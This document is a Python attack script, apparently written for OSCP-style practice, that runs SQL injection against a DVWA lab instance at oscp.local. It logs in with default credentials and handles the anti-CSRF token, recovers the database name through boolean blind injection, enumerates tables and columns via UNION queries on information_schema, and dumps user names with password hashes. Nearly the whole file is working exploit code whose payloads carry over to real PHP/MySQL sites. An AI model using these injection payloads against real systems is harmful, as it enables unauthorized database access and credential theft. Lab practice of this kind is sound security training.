#!/usr/bin/python3
# -*- coding: utf-8 -*-

import requests
import re
from bs4 import BeautifulSoup
import argparse
import string
import binascii

from urllib.parse import urlparse

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'



def csrf_token(target):
    try:
        # Make the request to the URL
        print ("\n[i] URL: %s/login.php" % target)
        r = requests.get("{0}/login.php".format(target), allow_redirects=False)

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Extract anti-CSRF token
    soup = BeautifulSoup(r.text)
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    print ("[i] user_token: %s" % user_token)

    # Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print ("[i] session_id: %s" % session_id)

    return session_id, user_token



def login():
    dvwa = "http://oscp.local/dvwa" 
    headers = {
        'User-Agent': 'nano'
    }

    r = requests.get(dvwa+"/login.php", allow_redirects=False)
    soup = BeautifulSoup(r.text,features="lxml")
    user_token = soup("input", {"name":"user_token"})[0]["value"]
    session_id = r.cookies.get_dict()['PHPSESSID']

    # cookies = requests.session().get(dvwa+'/login.php').cookies.get_dict()
    cookies = {
        'PHPSESSID': session_id,
        'security': 'medium',
    }

    data = {
        'username' : 'admin',
        'password' : 'password',
        'user_token' : user_token,
        'Login' : 'Login',
    }

    r = requests.post(dvwa+'/login.php', data=data, cookies=cookies, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    # print(soup)
    return cookies


def blink(cookies):

    dvwa = "http://oscp.local/dvwa" 
    headers = {
        'User-Agent': 'nano'
    }

    url = dvwa + "/vulnerabilities/sqli/"
    # print(url.format(1))
    
    # chercher le nom de la base de données
    ## checher la longueur du nom de la base
    ## select * from users where user_id = 1 and length(database())= 4
    i = 0
    while True:
        i = i + 1


        data = {
            # "id" : "0' union select user, password from users -- -",
            "id" : "1 and length(database())={} -- -",
            "Submit": "Submit",
        }
        data['id'] = data['id'].format(i)
        if (test(cookies, data)):
            break
    
    ## utiliser le la fonction substring pour trouver lettre par lettre
    for j in range(1,i+1):
        for y in string.printable:
            data = {
                # "id" : "0' union select user, password from users -- -",
                "id" : "1 and substring(database(),"+str(j)+",1)=0x{} -- -",
                "Submit": "Submit",
            }
            l =  binascii.hexlify(y.encode('utf-8'))
            # print("Here")
            
            data['id'] = data['id'].format(l.decode('utf-8'))
            
            if (test(cookies, data)):
                print(y)
                break
    # chercher les tables de la base de données
    # SELECT table_name FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
    # SELECT table_name FROM information_schema.tables WHERE table_schema = 'dvwa' -- -
    # SELECT table_name FROM information_schema.tables WHERE table_schema = 'dvwa' order by rand() limit 1
    data = {
        "id" : "0 union SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema=0x64767761 order by rand() limit 1 -- -",
        "Submit": "Submit",
    }

    # tables = []
    # for j in range(100):
    #     r = requests.post(url, cookies=cookies, data=data)
    #     soup = BeautifulSoup(r.text,features="lxml")
    #     # print(soup)
        
    #     # soup.find_all("p", string=True)

    #     for p in soup.find_all("pre"):
    #         q = p.get_text(separator=";")
    #         q = q.split(';')
    #         t = q[1].split(':')
    #         tables.append(t[1].strip())
    # tables = set(tables)
    # print (tables)


    # 0' union  SELECT COLUMN_NAME, ORDINAL_POSITION FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = 'dvwa' AND TABLE_NAME = 'users' -- -
    
    # print(binascii.hexlify(b'users'))
    # 7573657273

    data = {
        "id" : "0 union  SELECT COLUMN_NAME, ORDINAL_POSITION FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=0x64767761 AND TABLE_NAME =0x7573657273  order by rand() limit 1 -- -",
        "Submit": "Submit",
    }

    # columns = []
    # for j in range(100):
    #     r = requests.post(url, cookies=cookies, data=data)
    #     soup = BeautifulSoup(r.text,features="lxml")
    #     # print(soup)
        
    #     for p in soup("pre"):
    #         # print(p)
    #         q = p.get_text(separator=';')
    #         q = q.split(';')

    #         t = q[1].split(':')
    #         columns.append(t[1].strip())
    # # print(columns)
    # columns = set(columns)
    # for c in columns:
    #     print (c)

    data = {
        "id" : "0 union  SELECT user, password FROM users order by rand() limit 1 -- -",
        "Submit": "Submit",
    }


    users = {}
    for j in range(100):
        r = requests.post(url, cookies=cookies, data=data)
        soup = BeautifulSoup(r.text,features="lxml")
        # print(soup)
        
        for p in soup("pre"):
            q = p.get_text(separator=';')
            q = q.split(';')
            # print (q)
            u = q[1].split(':')[1].strip()
            p = q[2].split(':')[1].strip()
            users[u] = p


    for k,v in users.items():
        print (k+":"+v)

    # 7573657273


    exit()


    

    # chercher les tables de la base de données
    # chercher les noms des colonnes

    # r = requests.get(url, cookies=cookies, params=data)
    # soup = BeautifulSoup(r.text,features="lxml")
    # for p in soup("pre"):
    #     if (p.text == "ID: 1First name: adminSurname: admin"):
    #         print(p.text)
    #     else:
    #         print("non")

def test(cookies, data):
    dvwa = "http://oscp.local/dvwa" 
    headers = {
        'User-Agent': 'nano'
    }

    url = dvwa + "/vulnerabilities/sqli/"

    r = requests.post(url, cookies=cookies, data=data)
    soup = BeautifulSoup(r.text,features="lxml")
    
    for p in soup("pre"):
        # print(p.text)
        # print(len(p.findAll(text="First name: admin")))
        if(len(p.findAll(text="First name: admin"))==1):
            # print ("++ True")
            return True

   
    return False


cookies = login()
# cookies = "login()"
blink(cookies)

# print(csrf_token("http://oscp.local/dvwa"))


# SELECT first_name, last_name FROM users WHERE user_id = '$id'





































